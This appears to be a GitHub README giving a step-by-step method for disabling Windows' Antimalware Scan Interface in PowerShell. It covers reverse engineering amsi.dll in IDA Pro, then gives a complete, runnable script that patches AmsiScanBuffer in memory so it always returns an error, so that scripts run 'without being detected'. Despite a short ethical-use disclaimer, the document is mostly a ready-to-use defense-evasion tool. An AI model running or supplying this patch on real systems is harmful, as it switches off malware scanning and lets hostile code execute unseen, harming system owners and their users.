# Amsi-Patch-Updated-2025  
### **Bypass AMSI (Antimalware Scan Interface) in PowerShell**  

This guide shows how to dynamically patch the `AmsiScanBuffer` function in PowerShell to bypass AMSI, enabling the execution of scripts without being detected. This technique is useful for penetration testing, security research, and other ethical hacking practices.  

> **Disclaimer:** Always use these techniques in controlled, legal environments. Misuse may lead to legal and ethical consequences.

---

## **Steps to Patch AMSI in PowerShell**

### 1. **Reverse Engineer `amsi.dll` using IDA Pro**  
If you have a free version of IDA Pro (version 9.0 or below), follow these steps:  

- **Open `amsi.dll` in IDA Pro.**  
  Load the `amsi.dll` file and allow IDA to analyze the binary.
  
- **Navigate to Exports Tab.**  
  Press `Shift+F12` to open the **Exports** tab and locate the `AmsiScanBuffer` function.  
  Double-click `AmsiScanBuffer` to jump to its code.

- **Identify the Critical Code.**  
  Look for the key logic in `AmsiScanBuffer`. This is the part that handles the scanning process.  
  You should see something like this in the disassembly (example below):  

  ![Critical Code Example](https://github.com/user-attachments/assets/0ca7316e-0264-46a2-8e80-d9e2c0d24179)

- **Trace the Function Prologue.**  
  Follow the call chain of `AmsiScanBuffer` to understand how it interacts with other functions. The red arrow in the IDA disassembly highlights where the critical code lies.

- **Detect Control Flow Guard (CFG):**  
  Look for `_guard_dispatch_icall`. This is used for Control Flow Guard and helps prevent malicious modifications. You'll need to patch around this.

### 2. **Locate the Patch Area**  
- **Find where `AmsiScanBuffer` returns a result.**  
  This is the point where the AMSI scan function provides its result to the caller.  
- **Modify the return value.**  
  Rather than allowing a normal scan, modify it to always return an error code like `0x80070057` (invalid parameter), which will prevent AMSI from scanning.

### 3. **Create a PowerShell Patch**  

Here is how to write the PowerShell script that patches `AmsiScanBuffer`:  

- **Load the `amsi.dll` library.**  
  Use `LoadLibrary` to get a handle to `amsi.dll`.  
- **Locate the `AmsiScanBuffer` function.**  
  Use `GetProcAddress` to find the address of `AmsiScanBuffer`.
- **Change memory protection.**  
  Use `VirtualProtect` to modify the memory protection of the `AmsiScanBuffer` function, ensuring it’s writable.
- **Overwrite the function.**  
  Patch the function to return the error code `0x80070057` (invalid parameter) instead of performing the normal scan.

### 4. **Run the PowerShell Script to Bypass AMSI**  

Once the script is ready:  

- **Save and execute the PowerShell script.**  
  Running the script will patch `AmsiScanBuffer`, bypassing AMSI and allowing you to execute PowerShell scripts without being detected.
  
- **Result:**  
  AMSI will fail to scan scripts, enabling execution without triggering an alert.

---

## **PowerShell Script Example**  

Here's an example of how you can patch `AmsiScanBuffer` using PowerShell:  

```powershell
$Kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Kernel32" -Namespace "Win32" -PassThru

$AmsiDll = $Kernel32::LoadLibrary("amsi.dll")
$AmsiScanBuffer = $Kernel32::GetProcAddress($AmsiDll, "AmsiScanBuffer")

# Ensure we successfully located AmsiScanBuffer
if ($AmsiScanBuffer -eq [IntPtr]::Zero) {
    Write-Host "Failed to find AmsiScanBuffer!"
    exit
}

# Patch: MOV EAX, 0x57 000780, RET
$patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

[UInt32]$oldProtect = 0
$Kernel32::VirtualProtect($AmsiScanBuffer, [UInt32]6, 0x40, [Ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $AmsiScanBuffer, $patch.Length)

Write-Host "AMSI Patched Successfully!"
